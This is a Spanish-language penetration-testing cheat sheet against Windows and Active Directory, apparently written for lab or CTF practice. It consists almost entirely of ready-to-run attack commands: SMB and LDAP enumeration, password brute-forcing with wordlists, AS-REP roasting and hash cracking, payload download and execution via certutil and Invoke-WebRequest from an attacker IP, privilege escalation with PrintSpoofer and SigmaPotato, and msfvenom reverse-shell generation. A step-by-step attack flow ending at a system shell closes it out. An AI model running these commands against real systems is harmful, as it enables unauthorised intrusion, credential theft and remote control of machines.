# PENTEST CHEATSHEET SMB LDAP KERBEROS WINRM WINDOWS + BASIC WINDOWS COMMANDS

# =========================
# SMB 445 ENUMERACION
# =========================

netexec smb 192.168.1.50

smbclient -NL //192.168.1.50
smbmap --no-banner -H 192.168.1.50 -u  -p 
netexec smb 192.168.1.50 -u  -p  --shares

rpcclient -U "" 192.168.1.50 -c srvinfo

iconv -f ISO-8859-1 -t UTF-8 rockyou.txt -o rockyou_utf8.txt

netexec smb IP -u user -p rockyou_utf8.txt
netexec smb 192.168.1.47 -u user -p rockyou.txt --ignore-pw-decoding
netexec smb 192.168.1.37 -u user -p wordlist.txt | grep -v '[-]'

netexec smb 192.168.1.50 -u user -p pass
netexec smb 192.168.1.50 -u user -p pass --local-auth
netexec smb 192.168.1.50 -u user -p pass --users

evil-winrm -i 192.168.1.50 -u user -p pass

# =========================
# LDAP 389 ENUMERACION
# =========================

ldapsearch -x -H ldap://192.168.1.50 -s base namingcontexts

ldapsearch -x -H ldap://192.168.1.50 -b DC=domain,DC=nyx

ldapsearch -x -H ldap://192.168.1.50 -b DC=domain,DC=nyx (objectClass=user)

ldapsearch -H ldap://192.168.1.37 -D user@domain.nyx -w pass -b DC=domain,DC=nyx

ldapdomaindump -u DOMAIN\\user -p pass 192.168.1.50

# =========================
# KERBEROS 88
# =========================

kerbrute userenum --dc 192.168.1.50 -d domain.nyx users.txt

GetNPUsers.py domain.nyx/ -no-pass -usersfile users.txt
GetNPUsers.py domain.nyx/ -no-pass -usersfile users.txt | grep krb5asrep

john --wordlist=rockyou.txt hash
john --format=krb5asrep --wordlist=rockyou.txt hash

# =========================
# POST CREDENCIALES
# =========================

enum4linux -a -u user -p pass IP

netexec smb 192.168.1.50 -u user -p pass
netexec winrm 192.168.1.50 -u user -p pass

# =========================
# BLOODHOUND
# =========================

bloodhound-python -ns 192.168.1.50 -d domain.nyx -u user -p pass -c all --zip

sudo neo4j console

curl -L https://ghst.ly/getbhce > docker-compose.yml
sudo docker-compose pull
sudo docker-compose up

http://localhost:8080

# =========================
# TRANSFERENCIA ARCHIVOS
# =========================

python3 -m http.server 80

Invoke-WebRequest -Uri http://IP/file.exe -OutFile file.exe

impacket-smbserver share . -smb2support

copy \\IP\share\file.exe file.exe

upload file.exe

# =========================
# RCE WINDOWS
# =========================

certutil -urlcache -f http://IP/file.exe C:\Windows\Temp\file.exe

C:\Windows\Temp\file.exe
cmd /c C:\Windows\Temp\file.exe

Invoke-WebRequest http://IP/file.exe -OutFile C:\Temp\file.exe

copy \\IP\share\file.exe C:\Temp\file.exe

# =========================
# WINDOWS BASIC MOVEMENT (IMPORTANTE)
# =========================

# VER USUARIO ACTUAL
whoami

# VER INFO DEL SISTEMA
systeminfo
Get-ComputerInfo

# VER DIRECTORIO ACTUAL
cd
dir

# MOVERSE ENTRE CARPETAS
cd C:\Users
cd ..
cd C:\Users\Public
cd %TEMP%

# LISTAR ARCHIVOS OCULTOS Y DETALLADOS
dir /a
dir /a:h
dir /s

# LEER ARCHIVOS
type file.txt
more file.txt
powershell Get-Content file.txt

# CREAR / EDITAR ARCHIVOS RAPIDO
echo test > file.txt
echo append >> file.txt

# BUSCAR ARCHIVOS
dir C:\ /s /b | findstr password
where /r C:\ *.txt

# PROCESOS
tasklist
tasklist | findstr explorer

# RED
ipconfig
ipconfig /all
netstat -ano

# USUARIOS Y GRUPOS
net user
net user user
net localgroup

# PERMISOS
icacls file.txt
whoami /priv

# EJECUTAR COMO OTRO CONTEXTO (si aplica)
runas /user:user cmd

# =========================
# PRIVILEGE ESCALATION WINDOWS
# =========================

PrintSpoofer64.exe -i -c cmd
SigmaPotato.exe net user administrator Password1

upload winPEASx64.exe
winPEASx64.exe

# =========================
# MSFVENOM
# =========================

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=446 -f aspx -o rev.aspx

# =========================
# FLUJO GENERAL
# =========================

# 1 ENUMERAR SMB LDAP KERBEROS
# 2 NULL SESSIONS
# 3 USERS + SHARES
# 4 BRUTE FORCE
# 5 CREDENCIALES VALIDAS
# 6 SMB WINRM ACCESS
# 7 BLOODHOUND
# 8 PRIVESC WINDOWS
# 9 SYSTEM / SHELL FINAL

# =========================
# URL ENCODING
# =========================

space +
/ %2F
\ %5C
: %3A
? %3F
= %3D
& %26
# %23
